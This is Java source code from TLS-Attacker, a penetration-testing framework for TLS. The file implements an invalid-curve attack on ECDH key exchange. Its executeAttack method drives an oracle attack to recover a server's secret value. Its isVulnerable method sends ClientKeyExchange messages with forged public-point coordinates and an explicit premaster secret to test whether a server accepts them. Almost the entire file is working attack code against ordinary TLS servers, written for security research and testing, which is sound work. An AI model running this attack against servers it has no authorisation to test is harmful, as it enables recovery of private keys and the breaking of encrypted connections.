/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.crypto.ec.Curve;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 *
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttacker.class);

    public InvalidCurveAttacker(InvalidCurveAttackConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = config.createConfig();
        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getNamedCurves().get(0));
        Curve curve = CurveFactory.getNamedCurve(tlsConfig.getNamedCurves().get(0).name());
        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
        attacker.attack();
        BigInteger result = attacker.getResult();
        LOGGER.info("Result found: {}", result);
    }

    @Override
    public Boolean isVulnerable() {
        for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
            try {
                WorkflowTrace trace = executeProtocolFlow();
                if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
                    LOGGER.info("Received no finished Message in Protocolflow:" + i);
                } else {
                    LOGGER.info("Received a finished Message in Protocolflow: " + i + "! Server is vulnerable!");
                    return true;
                }
            } catch (WorkflowExecutionException ex) {
                LOGGER.debug(ex.getLocalizedMessage());
            }
        }
        return false;
    }

    private WorkflowTrace executeProtocolFlow() {
        Config tlsConfig = config.createConfig();
        tlsConfig.setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
        TlsContext tlsContext = new TlsContext(config.createConfig());
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
                tlsContext);
        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                .getActuallySentHandshakeMessagesOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE).get(0);
        // modify public point base X coordinate
        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
        message.setPublicKeyBaseX(x);
        // modify public point base Y coordinate
        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
        message.setPublicKeyBaseY(y);
        // set explicit premaster secret value (X value of the resulting point
        // coordinate)
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(config.getCurveFieldSize(), config.getPremasterSecret());
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
        message.getComputations().setPremasterSecret(pms);
        workflowExecutor.executeWorkflow();
        return trace;
    }
}
